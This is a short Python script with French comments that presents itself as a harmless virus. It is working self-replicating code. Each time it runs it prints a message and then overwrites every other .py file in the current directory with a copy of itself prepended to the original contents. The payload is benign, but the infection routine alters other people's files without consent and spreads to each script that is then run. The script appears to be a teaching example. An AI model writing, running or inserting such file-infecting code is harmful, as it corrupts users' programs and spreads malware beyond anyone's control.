import os 
import sys

MESSAGE = " Ceci est un virus innofensif \n"

nom_fichier_actuel = sys.argv[0]

def infection(fichier_cible=None):

    try:
        with open(nom_fichier_actuel, 'r') as fichier:
            contenu_virus = fichier.readlines()

            with open(fichier_cible, 'r') as fichier_cible_original:
                contenu_original = fichier_cible_original.readlines()

                if MESSAGE not in ''.join(contenu_original):
                    with open(fichier_cible, 'w') as fichier_cible_modifie:
                        fichier_cible_modifie.writelines(contenu_virus)
                        fichier_cible_modifie.write("\n# --- Fichier infecté ---\n")
                        fichier_cible_modifie.writelines(contenu_original)
                        print(f"Le fichier {fichier_cible} a ete infecte")

    except Exception as e:
        print(f"Erreur lors de l'infection du fichier {fichier_cible}: {e}")

def charge_utile():
    print(MESSAGE)

# Fonction principale du virus
def main():
    charge_utile() # Exécuter la charge utile à chaque exécution

    # Rechercher d'autres fichiers .py dans le même répertoire
    for nom_fichier in os.listdir('.'):
        if nom_fichier.endswith(".py") and nom_fichier != nom_fichier_actuel:
            infection(nom_fichier)

if __name__ == "__main__":
    main()